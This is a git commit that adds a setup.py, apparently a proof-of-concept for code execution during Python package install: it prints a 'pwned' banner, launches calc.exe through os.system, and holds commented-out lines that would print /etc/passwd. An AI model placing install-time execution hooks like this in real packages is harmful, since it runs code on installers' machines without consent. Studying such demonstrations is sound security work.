0b205279210fcd3fde20d874dd6ae0efc5f6ab0c
Mzcifer <36447501+Mzcifer@users.noreply.github.com>
2023-02-19 11:10:23 +0800

    Create setup.py

---
+++ setup.py
@@ -0,0 +1,20 @@
+msg = r"""
+                              _ 
+                             | |
+ _ ____      ___ __   ___  __| |
+| '_ \ \ /\ / / '_ \ / _ \/ _` |
+| |_) \ V  V /| | | |  __/ (_| |
+| .__/ \_/\_/ |_| |_|\___|\__,_|
+| |                             
+|_|             
+
+"""
+
+#Linux
+#f = open("/dev/tty", "w")
+#print(msg, file=f)
+#print(open("/etc/passwd").read(), file=f)
+
+#Windows
+import os
+os.system("calc.exe")
